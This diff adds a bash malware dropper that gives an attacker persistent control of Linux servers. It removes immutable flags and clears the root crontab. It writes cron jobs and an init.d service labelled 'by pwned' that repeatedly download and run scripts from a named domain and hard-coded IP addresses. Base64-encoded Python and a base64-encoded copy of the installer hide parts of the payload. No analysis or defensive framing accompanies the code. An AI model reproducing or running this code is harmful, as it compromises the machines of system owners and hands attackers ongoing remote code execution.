@@ -1,0 +1,55 @@
+#!/bin/bash
+
+if [ $(ping -c 1 bash.givemexyz.in 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
+then
+        url="bash.givemexyz.in"
+        base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn"
+else
+        url="205.185.116.78"
+        base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExNi43OC9kLnB5IikucmVhZCgpKSc="
+fi
+
+if if cat /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /etc/init.d/down | grep -q "205.185.113.151\|5.196.247.12\|bash.givemexyz.xyz\|cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8yMDUuMTg1LjExNi43OC9kLnB5IikucmVhZCgpKSc=\|194.156.99.30"
+then
+    chattr -i -a /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root /etc/cron.hourly/oanacroner1 /etc/init.d/down
+    crontab -r
+    echo "Cron not found"
+  	echo -e "*/1 * * * * root (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /etc/cron.d/root
+	echo -e "*/2 * * * * root (curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /etc/cron.d/apache
+	echo -e "*/3 * * * * root /dev/shm/dbusex -c $dns && /home/`whoami`/dbusex -c $dns && /var/run/dbusex -c $dns && /root/dbusex -c $dns\n##" > /etc/cron.d/nginx
+	echo -e "*/30 * * * *	(curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms\n; rm -rf /tmp/xms\n##" > /var/spool/cron/root
+	echo IyEvYmluL2Jhc2gKCmlmIFsgJChwaW5nIC1jIDEgYmFzaC5naXZlbWV4eXouaW4gMj4vZGV2L251bGx8Z3JlcCAiYnl0ZXMgb2YgZGF0YSIgfCB3YyAtbCApIC1ndCAnMCcgXTsKdGhlbgogICAgICAgIHVybD0iYmFzaC5naXZlbWV4eXouaW4iCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTlpWVhOb0xtZHBkbVZ0WlhoNWVpNXBiaTlrWkM1d2VTSXBMbkpsWVdRb0tTa24iCmVsc2UKICAgICAgICB1cmw9IjE5NC4xNTYuOTkuMzAiCiAgICAgICAgYmFzZT0iY0hsMGFHOXVJQzFqSUNkcGJYQnZjblFnZFhKc2JHbGlPMlY0WldNb2RYSnNiR2xpTG5WeWJHOXdaVzRvSW1oMGRIQTZMeTh4T1RRdU1UVTJMams1TGpNd0wyUXVjSGtpS1M1eVpXRmtLQ2twSnc9PSIKZmkKCmVjaG8gLWUgJyMhL2Jpbi9iYXNoCiMjIyBCRUdJTiBJTklUIElORk8KIyBQcm92aWRlczogICAgICAgICAgZG93bgojIFJlcXVpcmVkLVN0YXJ0OgojIFJlcXVpcmVkLVN0b3A6CiMgRGVmYXVsdC1TdGFydDogICAgIDIgMyA0IDUKIyBEZWZhdWx0LVN0b3A6CiMgU2hvcnQtRGVzY3JpcHRpb246IGRvd24gKGJ5IHB3bmVkKQojIyMgRU5EIElOSVQgSU5GTwooY3VybCAtZnNTTCBodHRwOi8vJHVybC94bXN8fHdnZXQgLXEgLU8tIGh0dHA6Ly8kdXJsL3htcyl8YmFzaCAtc2g7IGVjaG8gJGJhc2UgfCBiYXNlNjQgLWQgfCBiYXNoIC07IGx3cC1kb3dubG9hZCBodHRwOi8vJHVybC94bXMgL3RtcC94bXM7IGJhc2ggL3RtcC94bXM7IHJtIC1yZiAvdG1wL3htcycgPiAvZXRjL2luaXQuZC9kb3du | base64 -d | bash -
+
+
+  ###
+    #!/bin/bash
+
+    if [ $(ping -c 1 bash.givemexyz.in 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
+    then
+            url="bash.givemexyz.in"
+            base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn" // dd.py
+    else
+            url="194.156.99.30"
+            base="cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xOTQuMTU2Ljk5LjMwL2QucHkiKS5yZWFkKCkpJw=="
+    fi
+
+    echo -e '#!/bin/bash
+    ### BEGIN INIT INFO
+    # Provides:          down
+    # Required-Start:
+    # Required-Stop:
+    # Default-Start:     2 3 4 5
+    # Default-Stop:
+    # Short-Description: down (by pwned)
+    ### END INIT INFO
+    (curl -fsSL http://$url/xms||wget -q -O- http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms' > /etc/init.d/down
+
+  ###
+
+
+	mkdir -p /var/spool/cron/crontabs
+	echo -e "* * * * *	(curl -s http://$url/xms||wget -q -O - http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n##" > /var/spool/cron/crontabs/root
+	mkdir -p /etc/cron.hourly
+	echo "(curl -fsSL http://$url/xms||wget -q -O- http://$url/xms)|bash -sh; echo $base | base64 -d | bash -; lwp-download http://$url/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms" > /etc/cron.hourly/oanacroner1 | chmod 755 /etc/cron.hourly/oanacroner1
+
+fi
